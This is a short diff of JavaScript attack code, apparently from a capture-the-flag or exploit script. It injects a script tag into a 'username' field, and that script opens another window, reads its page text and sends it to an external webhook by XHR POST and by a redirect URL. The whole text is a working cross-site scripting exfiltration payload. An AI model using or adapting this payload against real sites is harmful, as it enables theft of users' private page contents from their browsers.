@@ -17,7 +17,6 @@ function post(url, data) {
 }
 
 function imgEnd() {
-  post(WEBHOOK, "end");
   window.location = PROFILE;
 }
 
@@ -30,6 +29,9 @@ try {
 
   const payload = `
 const profile = window.open("", "${OPEN}");
+let xhr = new XMLHttpRequest();
+xhr.open("POST", "${WEBHOOK}", false);
+xhr.send(profile.document.body.innerText);
 window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
